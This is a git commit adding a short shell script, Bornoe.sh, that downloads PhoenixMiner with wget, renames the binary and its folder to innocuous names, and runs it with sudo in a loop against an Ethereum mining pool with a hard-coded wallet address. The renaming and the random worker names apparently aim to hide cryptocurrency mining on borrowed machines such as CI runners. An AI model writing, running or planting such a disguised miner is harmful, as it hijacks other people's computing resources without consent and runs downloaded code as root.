9ff7682313503468f453ccd109b814776caf5b3b
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-07-12 18:26:10 -0600

    Create Bornoe.sh

---
+++ Bornoe.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
+mkdir runner 
+wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
+tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux
+mv PhoenixMiner_5.6d_Linux nodec && cd nodec
+mv PhoenixMiner waina
+while [ $x -le 20 ]
+do
+
+  sudo ./waina -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
+
+
+  x=$(( $x + 1 ))
+  sleep 120
+  echo "All done with $x times"
+done
